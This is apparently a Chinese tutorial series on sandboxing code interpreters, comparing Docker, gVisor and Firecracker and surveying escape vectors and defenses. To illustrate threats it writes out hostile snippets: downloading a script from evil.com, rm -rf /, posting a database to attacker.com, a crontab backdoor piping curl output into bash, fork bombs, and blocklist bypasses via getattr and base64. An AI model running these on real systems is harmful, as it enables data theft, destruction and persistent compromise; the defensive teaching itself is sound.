# 2-1 为什么不能直接 exec()？——代码执行的威胁模型

> **系列**：Series 2 · 那堵看不见的墙  
> **难度**：⭐⭐☆☆☆

---

## 从一个"聪明"的实现说起

假设你今天要实现一个最简单的 Code Interpreter，用 Python 的 `exec()` 函数：

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute():
    code = request.json['code']
    
    result = {}
    exec(code, result)  # 直接执行！
    
    return jsonify({"output": str(result)})
```

这能跑。这甚至能跑很多正常的请求。

然后用户发来了这个：

```python
import os
import subprocess
subprocess.run(['cat', '/etc/passwd'])           # 读取密码文件
subprocess.run(['wget', 'http://evil.com/shell.py'])  # 下载恶意脚本
os.system('rm -rf /')                            # 毁灭一切
```

**你的服务器宣告死亡。**

这不是假设。这是任何没有沙箱的代码执行服务面临的现实。

---

## 威胁模型：黑客想要什么？

在做安全设计之前，必须先回答：**攻击者的目标是什么？**

### 目标一：信息泄露（Exfiltration）

```python
import os
# 读取环境变量（可能包含 API key、数据库密码）
print(os.environ)

# 读取其他用户的数据文件
import glob
for f in glob.glob('/data/**/*', recursive=True):
    print(open(f).read()[:100])

# 调用外网，把数据发出去
import requests
requests.post('http://attacker.com/collect', data=open('/data/users.db').read())
```

### 目标二：横向移动（Lateral Movement）

```python
# 利用服务器的身份，攻击内网其他服务
import socket
s = socket.socket()
s.connect(('10.0.0.100', 5432))  # 连接内网数据库
```

### 目标三：资源耗尽（Resource Exhaustion）

```python
# Fork 炸弹：指数级创建进程，耗尽系统资源
import os
while True:
    os.fork()

# 内存炸弹
data = []
while True:
    data.append(' ' * 1024 * 1024)  # 无限分配内存
```

### 目标四：持久化后门（Persistence）

```python
# 在服务器上写入 crontab
import subprocess
subprocess.run(['crontab', '-l'])  # 列出定时任务
subprocess.run(['bash', '-c', '(crontab -l; echo "* * * * * curl http://attacker.com/run | bash") | crontab -'])
```

### 目标五：逃逸宿主（Container Escape）

更高级的攻击：突破容器边界，获得宿主机权限。这需要利用内核漏洞（如 CVE，Dirty COW 等），是威胁模型中最严重的场景。

---

## `exec()` 的哪些问题无法修补？

你可能会想：加几个黑名单不就好了？

```python
FORBIDDEN = ['os.system', 'subprocess', 'requests', '__import__']
if any(f in code for f in FORBIDDEN):
    return "禁止执行"
```

这是一场永远输不完的猫鼠游戏：

```python
# 绕过字符串匹配
getattr(__builtins__, '__import__')('os').system('ls')

# Base64 混淆
import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='))

# 动态构建字符串
cmd = 'os' + '.' + 'sys' + 'tem'
eval(cmd + "('ls')")
```

**结论：你无法在语言层面阻止恶意代码。必须在操作系统层面隔离。**

---

## 正确的威胁应对层次

| 威胁 | 防御手段 | 实现层次 |
|------|----------|----------|
| 文件系统访问 | 只读挂载 + 路径限制 | 容器/VM |
| 网络访问 | 网络命名空间隔离 | 内核 |
| 进程爆炸 | PID 限制 + cgroup | 内核 |
| 内存耗尽 | memory limit（cgroup）| 内核 |
| 内核逃逸 | microVM / gVisor | 硬件/用户态内核 |
| 跨租户访问 | 每个会话独立 VM | 基础设施 |

最关键的一句话：

> **Python 层面的沙箱（如 `restrictedexec`）无法抵抗有意的攻击。真正的沙箱必须在操作系统层面建立边界。**

---

## 下一篇

好，我们知道了 `exec()` 不够用，需要操作系统级隔离。但操作系统级隔离有很多种——容器、gVisor、microVM——它们有什么区别，该怎么选？

**→ 2-2：Container、gVisor 还是 microVM？——安全边界选型指南**

---
---

# 2-2 Container、gVisor 还是 microVM？——安全边界选型指南

> **系列**：Series 2 · 那堵看不见的墙  
> **难度**：⭐⭐⭐☆☆

---

## 安全边界的本质

所有隔离技术，本质上都在回答同一个问题：

> **当这段代码试图做坏事时，它能"看到"和"触碰"哪些东西？**

边界越清晰，攻击面越小，安全性越高。但边界越强，通常意味着越高的启动开销和运行开销。

我们来逐层分析：

---

## 层次一：Docker 容器（Namespace + Cgroups）

### 原理

Docker 容器使用 Linux 的两个原生特性：

**Namespaces**：让进程"以为"自己拥有独立的资源
- `pid` namespace：看不到宿主的其他进程
- `net` namespace：独立的网络接口
- `mnt` namespace：独立的文件系统视图
- `user` namespace：独立的 UID/GID 映射

**Cgroups**：限制进程能使用多少资源
- CPU 限制
- 内存上限
- 磁盘 I/O 速率

### 隔离边界

```
宿主内核（Host Kernel）
    │
    ├── 容器 A（共享宿主内核）
    │     └── 恶意进程
    │           └── 发起 syscall → 宿主内核直接处理
    │
    └── 宿主进程
```

**致命弱点**：容器与宿主**共享内核**。如果攻击者利用内核漏洞（CVE），可以从容器逃逸到宿主机。

历史上著名的容器逃逸漏洞：
- CVE-2019-5736（runc 漏洞）
- CVE-2022-0492（cgroup 逃逸）
- Dirty Cow（内存竞争条件）

### 结论

适合：**可信代码的轻量级隔离**，不适合运行任意用户代码。

---

## 层次二：gVisor（用户态内核）

### 原理

gVisor 在应用和宿主内核之间插入了一个"假内核"——Sentry：

```
应用进程（在 gVisor 容器中）
    │
    │ syscall（如 read()、socket()）
    ▼
Sentry（Go 实现的用户态内核，在宿主上作为普通进程运行）
    │  - 拦截所有 syscall
    │  - 在用户态模拟 Linux 内核行为
    │  - 仅透传极少数经过审计的 syscall 给宿主内核
    ▼
宿主内核（Host Kernel）
```

**关键安全属性**：

即使攻击者找到了 Sentry 的漏洞，他也只是攻破了一个普通用户进程，而不是内核。要想继续逃逸到宿主，需要再找一个 gVisor → 宿主的漏洞，大幅增加了攻击难度。

### 实现细节

- Sentry 实现了约 **200+ 个 Linux syscall**（约 70-80% 的覆盖率）
- 两种运行模式：`ptrace`（通用，较慢）和 `KVM`（需要 KVM 支持，较快）
- Sentry 包含虚拟文件系统（gofer 进程处理文件 I/O）和虚拟网络栈

```
┌──────────────────────────────────────┐
│          应用 (Python Code)           │
├──────────────────────────────────────┤
│    Sentry（Go 实现的虚拟 Linux 内核）  │
│  ┌─────────────────────────────────┐ │
│  │ 虚拟文件系统   │   虚拟网络栈     │ │
│  └─────────────────────────────────┘ │
├──────────────────────────────────────┤
│          宿主 Linux 内核               │
└──────────────────────────────────────┘
```

### 局限性

- 约 10-30% 的 I/O 性能开销
- 不支持所有 syscall（Docker-in-Docker、某些 systemd 功能无法使用）
- 仍是软件边界，非硬件隔离

### 谁在用？

Modal（ML workloads）、部分 Google Cloud 服务。

---

## 层次三：Firecracker microVM

### 原理

Firecracker 是 AWS 用 Rust 写的 VMM（Virtual Machine Monitor），它在 KVM 之上创建轻量级虚拟机：

```
宿主内核（Host Kernel，with KVM）
    │
    ├── Firecracker 进程（Rust VMM）
    │     ├── microVM 1（独立 Linux Kernel）
    │     │     └── Python Sandbox A
    │     │
    │     ├── microVM 2（独立 Linux Kernel）
    │     │     └── Python Sandbox B
    │     │
    │     └── ...
    │
    └── 宿主进程
```

每个 microVM 有自己独立的：
- Linux 内核实例
- 虚拟 CPU（vCPU）
- 内存空间
- 虚拟网络接口

### 隔离强度

攻击者要逃逸，需要突破：

```
Python 代码
    └→ Python 解释器
         └→ Guest Linux 内核
              └→ Firecracker VMM（Rust，~50K LoC）
                   └→ KVM hypervisor
                        └→ 宿主内核
```

每一层都是独立的攻击面，五层防御。

### 关键数字

- 启动时间：~125ms（含 kernel boot）
- 内存开销：< 5MB/实例
- 支持密度：150+ 实例/秒启动（单主机）
- 设备模拟：仅 5 种（virtio-net, virtio-blk, virtio-vsock, virtio-balloon, serial）

越少的设备模拟 = 越小的攻击面。

### 谁在用？

AWS Lambda、AWS Fargate、E2B（Code Interpreter SDK）。

---

## 四种方案对比矩阵

| 维度 | Docker | gVisor | Firecracker | Kata Containers |
|------|--------|--------|-------------|-----------------|
| 隔离强度 | ★★☆☆☆ | ★★★★☆ | ★★★★★ | ★★★★★ |
| 冷启动 | ~50ms | ~100ms | ~125ms | ~200ms |
| 内存开销 | 极小 | 中等 | ~5MB/实例 | 较高 |
| I/O 性能 | 优秀 | 中等（-10~30%）| 优秀 | 优秀 |
| 内核兼容性 | 完整 | 70-80% | 完整（Guest） | 完整（Guest） |
| GPU 支持 | 可以 | 不支持 | 需要特殊配置 | 部分支持 |
| 适用场景 | 可信代码 | 半可信，ML | 不可信代码，AI Agent | 企业合规 |

---

## 选型建议

**运行用户任意代码（Code Interpreter 核心场景）**
→ Firecracker 或 Kata Containers（硬件级隔离是唯一合理选择）

**ML 推理 workload，代码相对可信**
→ gVisor（性能-安全平衡最优）

**内部工具，代码来自自己团队**
→ Docker + seccomp profile + AppArmor（够用且运维简单）

---

## 下一篇预告

选型清楚了。接下来我们深入 gVisor 的心脏——Sentry，看看 Google 是如何用 Go 语言在用户态重写了 Linux 内核。

**→ 2-3：gVisor 深度解剖：Google 是如何用 Go 重写 Linux 内核的**

---
---

# 2-3 gVisor 深度解剖：Google 是如何用 Go 重写 Linux 内核的

> **系列**：Series 2 · 那堵看不见的墙  
> **难度**：⭐⭐⭐⭐☆

---

## 一个惊人的事实

gVisor 的核心组件 Sentry，本质上是一个用 **Go 语言实现的 Linux 内核子集**。

它不是模拟器，不是虚拟机，也不是容器——它是运行在用户态的"另一个操作系统"。

当你在 gVisor 容器里的 Python 代码执行 `open('/tmp/data.csv', 'r')` 时，这个 `open()` 调用：

1. 变成一个 `openat` syscall
2. 被 Sentry 拦截（通过 ptrace 或 KVM platform）
3. Sentry 的 Go 代码处理这个调用，查询虚拟文件系统
4. 如果需要真正读文件，Sentry 通过 `gofer` 进程（9P 协议）访问宿主文件系统
5. 把文件描述符返回给应用

宿主内核全程不知道这个 `open()` 的存在。

---

## Sentry 的内部结构

```
┌─────────────────────────────────────────────────────────────┐
│                    Sentry（用户态进程）                        │
│                                                               │
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────────────┐ │
│  │  Syscall    │  │  Virtual    │  │   Virtual Network    │ │
│  │  Interface  │  │  File       │  │   Stack              │ │
│  │  (200+ ops) │  │  System     │  │   (TCP/IP in Go)     │ │
│  └──────┬──────┘  └──────┬──────┘  └──────────────────────┘ │
│         │                │                                    │
│  ┌──────▼──────────────▼──────────────────────────────────┐  │
│  │              Task / Thread Management                   │  │
│  │              (进程、线程、信号的完整模拟)                  │  │
│  └─────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
        │                           │
        ▼                           ▼
   宿主内核                      Gofer 进程
 （极少数 syscall）           （9P 文件协议代理）
```

### 关键子系统

**1. Syscall Interface**

这是 Sentry 的入口。Go 代码实现了 Linux 每个支持的 syscall 的完整语义。

以 `read()` 为例，Sentry 需要实现：
- 参数验证（fd 是否有效、缓冲区地址是否合法）
- 文件偏移量管理
- 阻塞/非阻塞语义
- 信号中断处理
- 返回值和 errno 的正确设置

这些"细节"，是 Sentry 代码量庞大的原因（数十万行 Go 代码）。

**2. Virtual File System（VFS2）**

Sentry 有自己的虚拟文件系统层，支持多种文件系统类型：
- `host`：映射宿主文件系统的目录（通过 Gofer）
- `tmpfs`：内存文件系统（完全在 Sentry 内部）
- `procfs`：虚拟 `/proc` 文件系统
- `devfs`：虚拟 `/dev` 文件系统

**3. Virtual Network Stack（netstack）**

这可能是 gVisor 最"大胆"的部分：它用 Go 实现了完整的 TCP/IP 网络栈！

```
应用 → socket() → Sentry netstack（Go TCP/IP）→ 宿主网络
```

这意味着：网络数据包的解析和生成，完全在 Sentry 的用户态进行。宿主内核只看到 Sentry 进程的网络 I/O，而不知道里面有多少虚拟 socket。

---

## 两种运行平台（Platform）

gVisor 的 syscall 拦截方式有两种，对应两种运行模式：

### ptrace Platform（通用模式）

```
Sentry 作为 ptrace tracer
    └── 追踪（trace）每一个应用进程
          └── 每个 syscall 触发 SIGTRAP → 暂停应用 → Sentry 处理 → 恢复应用
```

**优点**：不需要 KVM 权限，任何 Linux 环境可用  
**缺点**：每次 syscall 都有进程切换开销，性能较低

### KVM Platform（高性能模式）

```
Sentry 利用 KVM 创建一个小虚拟机
    └── 应用在虚拟机的 Guest 模式运行
          └── syscall 触发 VM Exit → Sentry 作为 VMM 处理 → VM Entry 返回
```

**优点**：性能更好（VM Exit 比 ptrace 更高效）  
**缺点**：需要 KVM 权限（/dev/kvm），某些云环境不支持嵌套虚拟化

---

## gVisor 的安全代码规范

gVisor 团队对安全有近乎偏执的代码规范：

```go
// ❌ 禁止：所有 unsafe 代码必须隔离在 _unsafe.go 文件中
// ✅ 正确的文件命名：memory_unsafe.go

// ❌ 禁止：引入 CGo
// import "C"

// ❌ 禁止：在核心包中引入外部依赖
// 只有 setup 代码可以引入有限的外部包

// ✅ 所有 syscall 拦截之前的代码，必须是可审计的 Go 代码
```

这些规范的目的是：让安全审计员可以清楚地知道哪些代码接触了"危险"操作，最大限度地降低供应链攻击风险。

---

## gVisor 的局限：不支持的 syscall

gVisor 目前不支持（或部分支持）的 Linux 特性：

- `perf_event_open`（性能监控）
- 某些 ioctl（设备控制）
- GPU 相关 syscall（CUDA 不支持）
- `clone3` 的部分标志
- `io_uring`（异步 I/O 接口）

对于 Code Interpreter 的典型场景（数据分析、计算、可视化），这些限制通常不影响正常使用。但如果你的代码需要 GPU 或某些系统级操作，gVisor 就不合适了。

---

## 性能基准

```
操作类型          | 原生 Linux | gVisor (ptrace) | gVisor (KVM) | Firecracker
──────────────────────────────────────────────────────────────────────────────
文件读写 (小文件) |  1x        |  2-3x 慢         | 1.5-2x 慢    | ~1x
网络 (localhost)  |  1x        |  3-5x 慢         | 2-3x 慢      | ~1x  
纯计算 (CPU)      |  1x        |  ~1x             | ~1x          | ~1x
系统调用频率高    |  1x        |  5-10x 慢        | 2-4x 慢      | ~1x
```

**结论**：对于 Code Interpreter 中的数值计算（numpy、pandas 的向量化操作），gVisor 的性能开销几乎可以忽略。I/O 密集型任务才会看到明显差距。

---

## 下一篇

gVisor 是软件层面的解决方案。而 Firecracker 给出了硬件级隔离的答案。

**→ 2-4：Firecracker：AWS 用来跑 Lambda 的秘密武器**

---
---

# 2-4 Firecracker：AWS 用来跑 Lambda 的秘密武器

> **系列**：Series 2 · 那堵看不见的墙  
> **难度**：⭐⭐⭐⭐☆

---

## 一个不可能完成的任务

2018 年，AWS 面临一个矛盾：

- Lambda 需要支持**任意用户代码**（安全要求：必须有 VM 级别的隔离）
- Lambda 需要支持**毫秒级启动**和**数百万并发**（性能要求：传统 VM 太重）
- Lambda 需要**极高的密度**（成本要求：每台主机运行尽量多的实例）

传统 VM（QEMU/KVM）：启动需要 1-2 秒，内存开销数百 MB，根本满足不了需求。
Docker 容器：启动快，密度高，但安全性不够——Lambda 不能接受跨用户的内核共享。

**Firecracker 就是 AWS 为解决这个矛盾而造出来的东西。**

---

## Firecracker 的设计哲学：极简即安全

Firecracker 只做一件事：**在 KVM 上运行轻量级虚拟机**。

它有意地不做很多"正常 VMM 该做的事"：

| 传统 VMM（QEMU）| Firecracker |
|----------------|-------------|
| 模拟 USB 控制器 | ❌ 不支持 |
| 模拟声卡 | ❌ 不支持 |
| 模拟 PCI 总线 | ❌ 不支持 |
| 模拟图形卡 | ❌ 不支持 |
| 模拟串口 | ✅ 仅 1 个 |
| virtio-net | ✅ 仅 1 个 |
| virtio-blk | ✅ 支持多个 |
| virtio-vsock | ✅ 支持 |

**只有 5 种虚拟设备。**

这个选择看起来很残忍，但从安全角度是天才之举：**设备模拟代码是 VMM 历史上最多漏洞的地方**。QEMU 有超过 10 万行的设备模拟代码，而 Firecracker 的整个代码库不到 5 万行。

每少一种设备，就少了一批潜在的漏洞。

---

## Firecracker 的架构

```
物理主机
│
├── KVM（Linux 内核模块，提供硬件虚拟化）
│     │
│     └── Hardware Virtualization (Intel VT-x / AMD-V)
│
├── Firecracker 进程（Rust，每个 microVM 对应一个进程）
│     │
│     ├── REST API Server（配置和管理接口）
│     │
│     ├── vCPU 线程（虚拟 CPU，通过 KVM ioctl 驱动）
│     │
│     ├── 设备模拟（virtio-net, virtio-blk 等）
│     │
│     └── Seccomp Filter（仅允许 Firecracker 使用约 26 个 syscall）
│
└── Guest（microVM 内部）
      │
      ├── Linux Kernel（精简版，如 5.10）
      │
      └── 用户进程（Python Code Interpreter）
```

注意：Firecracker 进程本身也运行在 seccomp 过滤器下，只允许使用约 26 个 syscall。即使 Firecracker 被攻破，攻击者能做的事也极其有限。

---

## 125ms 启动之谜：为什么这么快？

传统 VM 启动需要 1-2 秒，Firecracker 只需要 ~125ms，秘密在哪里？

**1. 极简的 Guest Kernel**

Firecracker 使用专门为 microVM 优化的 Linux 内核：
- 关闭了大量不需要的内核模块（USB、蓝牙、声音...）
- 禁用了复杂的 BIOS/UEFI 初始化
- 直接从 kernel image 启动，跳过 bootloader

**2. 无 BIOS 模拟**

传统 VM 启动需要经过 BIOS POST → Bootloader → Kernel 三个阶段。Firecracker 直接加载内核，跳过了 BIOS 阶段（节省 ~500ms）。

**3. 精简的设备初始化**

只有 5 种设备需要初始化，驱动加载极快。

**4. 内存气球（Memory Ballooning）**

Firecracker 支持内存气球技术，可以动态调整 microVM 的内存分配，提高主机内存利用率。

---

## Snapshot：冷启动优化的杀手锏

即使 125ms 已经很快，对于高频调用场景仍然有开销。Firecracker 的 **Snapshot（快照）** 功能可以进一步优化：

**创建快照：**

```
1. 启动一个 "golden" microVM
2. 完成所有初始化（启动 Python、预加载 pandas/numpy/matplotlib）
3. 对这个状态拍快照（CPU registers + 内存 + 设备状态）
4. 保存快照文件
```

**从快照恢复：**

```
1. 从快照文件恢复 microVM 状态
2. microVM 立即"醒来"，处于完全初始化的状态
3. 等待代码注入
```

**恢复时间：< 50ms（甚至更低）**

E2B 等平台大量使用这项技术：他们预先创建含有 pandas、numpy、matplotlib 等常用包的快照，每次用户请求时直接恢复快照，而不是从零启动。

---

## 密度：一台主机能跑多少个？

AWS 的数据：一台普通的宿主机可以运行 **数千个并发 Lambda 函数**（每个都是一个独立的 microVM）。

这是怎么实现的？

**内存 Overcommit（超订）**

每个 microVM 分配的内存是虚拟内存，实际物理内存按需分配。一个声称使用 256MB 内存的 microVM，可能实际只使用了 50MB（另外的 206MB 还没有访问）。

**Copy-on-Write 文件系统**

所有 microVM 共享同一个只读的 rootfs 镜像，通过 COW 实现各自的写操作。100 个 microVM 只需要存储一份基础镜像。

**CPU 时间共享**

Firecracker 通过 KVM 的虚拟化，让数百个 vCPU 共享物理 CPU 资源。

---

## 下一篇

我们已经理解了隔离技术。但现实中，沙箱被突破的案例是真实存在的——它们是怎么发生的？

**→ 2-5：沙箱逃逸：那些年被发现的攻击向量与防御之道**

---
---

# 2-5 沙箱逃逸：那些年被发现的攻击向量与防御之道

> **系列**：Series 2 · 那堵看不见的墙  
> **难度**：⭐⭐⭐⭐⭐

---

## 没有完美的沙箱

安全领域有一句让人不安的格言：

> "没有完美的防御，只有延迟被攻破的时间。"

即使是 Firecracker 这样的 microVM，也不是无懈可击的。了解真实的攻击向量，是构建真正安全系统的前提。

本文不是鼓励攻击，而是帮助防御者理解他们在保护什么。

---

## 攻击向量一：内核 CVE 利用

### Dirty COW（CVE-2016-5195）

这是 Linux 历史上最臭名昭著的内核漏洞之一，影响所有 Linux 内核版本（2.6.22-4.8.3）。

**原理（简化版）**：
利用 `copy-on-write` 机制中的竞争条件，普通用户进程可以向只读内存页写入数据——包括 `/etc/shadow`（密码文件）。

**对 Docker 容器的影响**：
容器共享宿主内核，因此容器内的代码可以利用 Dirty COW 修改宿主系统的只读文件，实现提权和逃逸。

**对 microVM 的影响**：
每个 microVM 有独立的 Guest 内核。即使 Dirty COW 在 Guest 内核中成功，攻击者只能提升在 Guest 内的权限，无法直接影响宿主内核。要继续攻击，还需要找到 microVM 到宿主的漏洞（如 KVM 漏洞）。

**教训**：及时给 Guest 内核打补丁，仍然重要。

### CVE-2019-5736（runc 容器逃逸）

这个漏洞允许容器内的恶意进程覆写宿主机的 `runc` 二进制文件，从而在下次执行 `docker exec` 时以宿主 root 权限运行任意代码。

**触发条件**：
- 攻击者需要控制容器的 PID 1
- 或者，在容器已运行的情况下执行 `docker exec`

这个漏洞影响了几乎所有使用 runc 的容器环境（Docker、Kubernetes）。

---

## 攻击向量二：虚拟设备漏洞

虚拟化环境中，Guest 与 Host 的通信通过虚拟设备进行（如 virtio-net、virtio-blk）。这些设备驱动中的漏洞可能允许 Guest 逃逸。

### QEMU 的历史漏洞案例

QEMU（传统 VMM）在其大量的设备模拟代码中有丰富的漏洞历史：

- **VirtFuzz（2023）**：研究人员发现了 6 个 virtio 设备中的内存越界漏洞
- **Venom（CVE-2015-3456）**：软盘控制器模拟代码中的缓冲区溢出，可从 Guest 逃逸

**Firecracker 的应对**：
通过将虚拟设备种类压缩到 5 种，并用 Rust 实现（内存安全语言），大幅减少了这类攻击面。

---

## 攻击向量三：侧信道攻击

即使计算是完全隔离的，物理资源的共享仍然可能泄露信息。

### Spectre/Meltdown（2018）

这是现代计算机架构中最深刻的安全危机：

**原理**：现代 CPU 的**推测执行（Speculative Execution）** 机制会在分支结果确定之前预先执行指令，并将结果缓存到 CPU Cache。通过测量 Cache 的访问时间（cache timing），恶意程序可以推断出不该被看到的内存内容。

**对 Code Interpreter 的影响**：
运行在同一物理主机上的两个沙箱，即使有 VM 级别的隔离，理论上也可以通过 Spectre 变体互相泄露信息（如另一个用户的 API key 被读取）。

**防御措施**：
- CPU 微码更新（牺牲 5-30% 性能）
- Kernel Page Table Isolation (KPTI)
- 每个 microVM 使用独立的物理 CPU Core（最彻底，但最昂贵）

---

## 攻击向量四：逻辑漏洞

不需要内核漏洞，仅靠系统设计的逻辑错误也能造成沙箱隔离失效。

### 跨租户数据访问案例（Asana MCP，2025 年）

2025 年，Asana 部署了一个 MCP Server 用于 AI Agent 集成。由于逻辑漏洞，**来自一个租户的请求可以检索到另一个租户的缓存数据**。

这个漏洞暴露了 34 天，影响约 1000 个企业客户。

技术根因：**只验证了 User Identity，没有验证 Agent Identity**，导致跨租户的 cache key 碰撞。

**教训**：多租户系统的每一层缓存（Redis、CDN、本地缓存）都需要包含租户 ID 作为 cache key 的一部分。

### 文件路径穿越

```python
# 恶意代码尝试读取沙箱外的文件
open('/proc/1/environ')  # 读取 PID 1 进程的环境变量
open('/../../etc/passwd')  # 路径穿越

# 通过符号链接
import os
os.symlink('/etc/passwd', '/tmp/harmless.txt')
open('/tmp/harmless.txt').read()
```

**防御**：

1. 在 VFS 层（Sentry 或容器 mnt namespace）限制文件系统视图
2. 对输出结果进行扫描（检测 `/etc/passwd` 格式的内容）
3. 以非 root 用户运行沙箱进程

---

## 防御体系：深度防御的工程实践

真正的沙箱安全不是一道墙，而是**层层递进的防御体系**：

```
Defense Layer 1：语言层
  └── 代码静态分析（可选，无法穷举所有攻击）

Defense Layer 2：容器/VM 层
  └── gVisor / Firecracker（核心隔离层）

Defense Layer 3：系统调用过滤
  └── seccomp-bpf 白名单（只允许必要的 syscall）

Defense Layer 4：网络层
  └── 默认断网；如需网络，使用出站白名单

Defense Layer 5：文件系统层
  └── 只读 rootfs + 限制写入路径

Defense Layer 6：资源层
  └── CPU quota + memory limit + 执行超时

Defense Layer 7：监控与告警层
  └── 异常 syscall 告警、资源使用监控、执行日志
```

没有任何单一层次是完美的。防御的目标是：让攻击者在每一层都需要单独突破，使攻击成本远超收益。

---

## Series 2 总结

你现在理解了：

- 为什么 `exec()` 不够用（威胁模型）
- 五种隔离技术的原理与强度对比
- gVisor 用 Go 重写 Linux 内核的技术细节
- Firecracker 如何用极简设计实现 125ms 启动的硬件级隔离
- 真实的沙箱逃逸案例与防御体系

沙箱解决了"代码执行安全"的问题。接下来的问题是：

**LLM 怎么知道该什么时候写代码、怎么写、写错了怎么办？**

**→ 进入 Series 3：LLM 的手与眼——Tool Use 机制深度剖析**

---

*推荐进一步阅读：gVisor 官方安全文档（gvisor.dev/docs/architecture_guide/security/）、Firecracker 设计白皮书（firecracker-microvm.github.io）*
